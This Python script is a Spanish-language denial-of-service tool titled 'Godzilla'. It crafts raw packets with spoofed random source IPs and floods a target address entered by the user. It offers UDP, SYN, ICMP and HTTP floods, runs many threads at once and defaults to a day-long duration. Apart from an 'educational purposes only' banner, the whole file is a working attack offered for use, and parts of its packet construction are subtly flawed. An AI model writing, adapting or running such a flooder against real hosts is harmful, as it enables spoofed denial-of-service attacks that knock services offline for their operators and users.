import os
import socket
import random
import struct
import threading
import time
from queue import Queue
from colorama import Fore, Style

BLUE = '\033[1;34m'
RESET = '\033[0m'
print(
    f"""
    {Fore.BLUE}
     ▄▄ •       ·▄▄▄▄  ·▄▄▄▄•▪  ▄▄▌  ▄▄▌   ▄▄▄· 
    ▐█ ▀ ▪▪     ██▪ ██ ▪▀·.█▌██ ██•  ██•  ▐█ ▀█ 
    ▄█ ▀█▄ ▄█▀▄ ▐█· ▐█▌▄█▀▀▀•▐█·██▪  ██▪  ▄█▀▀█ 
    ▐█▄▪▐█▐█▌.▐▌██. ██ █▌▪▄█▀▐█▌▐█▌▐▌▐█▌▐▌▐█ ▪▐▌
    ·▀▀▀▀  ▀█▄▀▪▀▀▀▀▀• ·▀▀▀ •▀▀▀.▀▀▀ .▀▀▀  ▀  ▀  V.1.0.2
    {Style.RESET_ALL}
    """
)

# Tipos de ataque
ATTACK_TYPES = {
    "udp": {
        "name": "UDP Flood",
        "description": "Envía una gran cantidad de paquetes UDP al objetivo.",
        "protocol": socket.IPPROTO_UDP,
        "default_payload_size": 1024,
        "default_threads": 10,
        "default_duration": 86400,
    },
    "syn": {
        "name": "SYN Flood",
        "description": "Envía una gran cantidad de solicitudes de conexión TCP (SYN) sin completar el handshake.",
        "protocol": socket.IPPROTO_TCP,
        "default_payload_size": 0,  # No se usa payload en SYN Flood
        "default_threads": 100,
        "default_duration": 86400,
    },
    "icmp": {
        "name": "ICMP Flood",
        "description": "Envía una gran cantidad de pings (ICMP Echo Request) al objetivo.",
        "protocol": socket.IPPROTO_ICMP,
        "default_payload_size": 64,  # Tamaño típico de un ping
        "default_threads": 100,
        "default_duration": 86400,
    },
    "http": {
        "name": "HTTP Flood",
        "description": "Envía una gran cantidad de solicitudes HTTP al objetivo.",
        "protocol": socket.IPPROTO_TCP,
        "default_payload_size": 1024,
        "default_threads": 100,
        "default_duration": 86400,
    },
}

# Generar una dirección IP falsa
def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

# Calcular checksum del paquete IP
def checksum(data):
    if len(data) % 2 != 0:
        data += b'\x00'
    s = sum(struct.unpack("!{}H".format(len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF

# Construir encabezado IP
def build_ip_header(source_ip, dest_ip, protocol):
    ip_ver_ihl = (4 << 4) + 5
    ip_tos = 0
    ip_tot_len = 20 + 20  # Tamaño del encabezado IP + encabezado TCP/UDP (aproximado)
    ip_id = random.randint(0, 65535)
    ip_frag_off = 0
    ip_ttl = 64
    ip_proto = protocol
    ip_check = 0
    ip_saddr = socket.inet_aton(source_ip)
    ip_daddr = socket.inet_aton(dest_ip)

    header = struct.pack(
        "!BBHHHBBH4s4s",
        ip_ver_ihl, ip_tos, ip_tot_len, ip_id, ip_frag_off,
        ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr
    )

    ip_check = checksum(header)
    header = struct.pack(
        "!BBHHHBBH4s4s",
        ip_ver_ihl, ip_tos, ip_tot_len, ip_id, ip_frag_off,
        ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr
    )
    return header

# Construir encabezado UDP
def build_udp_header(source_ip, dest_ip, source_port, dest_port, payload):
    udp_source_port = source_port
    udp_dest_port = dest_port
    udp_len = 8 + len(payload) 
    udp_check = 0

    pseudo_header = struct.pack(
        "!4s4sBBH",
        socket.inet_aton(source_ip), socket.inet_aton(dest_ip), 0, socket.IPPROTO_UDP, udp_len
    )

    data = pseudo_header + payload 
    udp_check = checksum(data)

    udp_header = struct.pack("!HHHH", udp_source_port, udp_dest_port, udp_len, udp_check)
    return udp_header + payload


# Construir encabezado TCP (para SYN Flood y HTTP Flood)
def build_tcp_header(source_ip, dest_ip, source_port, dest_port, flags, payload=""):
    tcp_seq = random.randint(0, 4294967295)
    tcp_ack_seq = 0
    tcp_doff = 5  # 5 * 4 = 20 bytes
    tcp_flags = flags
    tcp_window = socket.htons(5840)
    tcp_check = 0
    tcp_urg_ptr = 0

    tcp_offset_res = (tcp_doff << 4) + 0
    tcp_header = struct.pack(
        "!HHLLBBHHH",
        source_port, dest_port, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags, tcp_window,
        tcp_check, tcp_urg_ptr,
    )

    # Pseudo encabezado para calcular el checksum TCP
    source_address = socket.inet_aton(source_ip)
    dest_address = socket.inet_aton(dest_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header) + len(payload)

    psh = struct.pack(
        "!4s4sBBH",
        source_address, dest_address, placeholder, protocol, tcp_length
    )
    psh = psh + tcp_header + payload.encode()

    tcp_check = checksum(psh)

    tcp_header = struct.pack(
        "!HHLLBBHHH",
        source_port, dest_port, tcp_seq, tcp_ack_seq, tcp_offset_res, tcp_flags, tcp_window,
        tcp_check, tcp_urg_ptr,
    )

    return tcp_header


# Construir paquete ICMP (para ICMP Flood)
def build_icmp_packet(data):
    icmp_type = 8  # ICMP Echo Request
    icmp_code = 0
    icmp_checksum = 0
    icmp_id = os.getpid() & 0xFFFF
    icmp_seq = 1

    header = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
    packet = header + data

    icmp_checksum = checksum(packet)
    header = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
    packet = header + data

    return packet

# Construir paquete HTTP (para HTTP Flood)
def build_http_packet(host, path="/", method="GET"):
    packet = f"{method} {path} HTTP/1.1\r\n"
    packet += f"Host: {host}\r\n"
    packet += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\n"
    packet += "Accept-language: en-US,en,q=0.5\r\n"
    packet += "Connection: keep-alive\r\n"
    packet += "\r\n"
    return packet


# Función para enviar paquetes
def send_packet(sock, packet, dest_ip, dest_port):
    try:
        sock.sendto(packet, (dest_ip, dest_port))
        return True
    except OSError as e:
        print(f"\r{BLUE}Error al enviar el paquete: {e}{RESET}")
        return False


# Función para realizar el ataque
def attack(attack_queue):
    while True:
        attack_type, dest_ip, dest_port, payload_size, spoofed_ip, source_port = attack_queue.get()

        if attack_type == "udp":
            ip_header = build_ip_header(spoofed_ip, dest_ip, socket.IPPROTO_UDP)
            payload = b'X' * payload_size
            udp_header = build_udp_header(spoofed_ip, dest_ip, source_port, dest_port, payload)
            packet = ip_header + udp_header
            sent = send_packet(sock, packet, dest_ip, dest_port)

        elif attack_type == "syn":
            ip_header = build_ip_header(spoofed_ip, dest_ip, socket.IPPROTO_TCP)
            tcp_header = build_tcp_header(spoofed_ip, dest_ip, source_port, dest_port, flags=2)  # SYN flag
            packet = ip_header + tcp_header
            sent = send_packet(sock, packet, dest_ip, dest_port)

        elif attack_type == "icmp":
            ip_header = build_ip_header(spoofed_ip, dest_ip, socket.IPPROTO_ICMP)
            payload = b'X' * payload_size
            icmp_packet = build_icmp_packet(payload)
            packet = ip_header + icmp_packet
            # Los paquetes ICMP se envían al puerto 0
            sent = send_packet(sock, packet, dest_ip, 0)  

        elif attack_type == "http":
            ip_header = build_ip_header(spoofed_ip, dest_ip, socket.IPPROTO_TCP)
            http_packet = build_http_packet(dest_ip)
            tcp_header = build_tcp_header(spoofed_ip, dest_ip, source_port, dest_port, flags=16, payload=http_packet)  # ACK flag
            packet = ip_header + tcp_header + http_packet.encode()
            sent = send_packet(sock, packet, dest_ip, dest_port)

        if sent:
            sent_packets_count.increment()
            print(f"\r{BLUE}Enviados {sent_packets_count.value} paquetes a {dest_ip}:{dest_port} (Spoofed IP: {spoofed_ip}){RESET}", end="")


# Clase para contador thread-safe
class ThreadSafeCounter:
    def __init__(self):
        self._lock = threading.Lock()
        self._value = 0

    def increment(self):
        with self._lock:
            self._value += 1

    @property
    def value(self):
        with self._lock:
            return self._value


# Función principal
if __name__ == "__main__":
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except PermissionError:
        print(f"{BLUE}Necesitas permisos de root para ejecutar este script.{RESET}")
        exit()
    except OSError as e:
        print(f"{BLUE}Error al crear el socket: {e}{RESET}")
        exit()

    print(f"{BLUE}Herramienta de ataque de red (solo para fines educativos){RESET}")
    print(f"{BLUE}¡Úsalo responsablemente!{RESET}")

    dest_ip = input(f"{BLUE}Introduce la IP objetivo: {RESET}")
    
    # Validación básica de la IP
    try:
        socket.inet_aton(dest_ip)
    except socket.error:
        print(f"{BLUE}IP inválida.{RESET}")
        exit()

    dest_port = int(input(f"{BLUE}Introduce el puerto objetivo (0 para ICMP): {RESET}"))

    print(f"{BLUE}Tipos de ataque disponibles:{RESET}")
    for key, value in ATTACK_TYPES.items():
        print(f"  - {key}: {value['name']} - {value['description']}")

    attack_type = input(f"{BLUE}Introduce el tipo de ataque: {RESET}").lower()

    if attack_type not in ATTACK_TYPES:
        print(f"{BLUE}Tipo de ataque inválido.{RESET}")
        exit()

    # Opciones de personalización
    while True:
        custom_choice = input(f"{BLUE}¿Deseas usar la configuración por defecto o personalizarla? (d/c): {RESET}").lower()
        if custom_choice in ("d", "c"):
            break
        else:
            print(f"{BLUE}Opción inválida. Introduce 'd' o 'c'.{RESET}")

    if custom_choice == "d":
        payload_size = ATTACK_TYPES[attack_type]["default_payload_size"]
        attack_threads = ATTACK_TYPES[attack_type]["default_threads"]
        attack_duration = ATTACK_TYPES[attack_type]["default_duration"]
    else:
        payload_size = int(input(f"{BLUE}Introduce el tamaño del payload (bytes): {RESET}"))
        attack_threads = int(input(f"{BLUE}Introduce el número de hilos de ataque: {RESET}"))
        attack_duration = int(input(f"{BLUE}Introduce la duración del ataque (segundos): {RESET}"))

    attack_queue = Queue()
    sent_packets_count = ThreadSafeCounter()

    # Iniciar hilos de ataque
    threads = []
    for _ in range(attack_threads):
        thread = threading.Thread(target=attack, args=(attack_queue,))
        thread.daemon = True
        thread.start()
        threads.append(thread)

    # Encolar tareas de ataque
    start_time = time.time()
    while time.time() - start_time < attack_duration:
        spoofed_ip = random_ip()
        source_port = random.randint(1024, 65535)
        attack_queue.put((attack_type, dest_ip, dest_port, payload_size, spoofed_ip, source_port))
        time.sleep(0.01)  # Ajustar para controlar la velocidad del ataque

    # Esperar a que los hilos terminen
    for thread in threads:
        thread.join()

    print(f"\n{BLUE}Ataque finalizado. Se enviaron {sent_packets_count.value} paquetes.{RESET}")
    sock.close()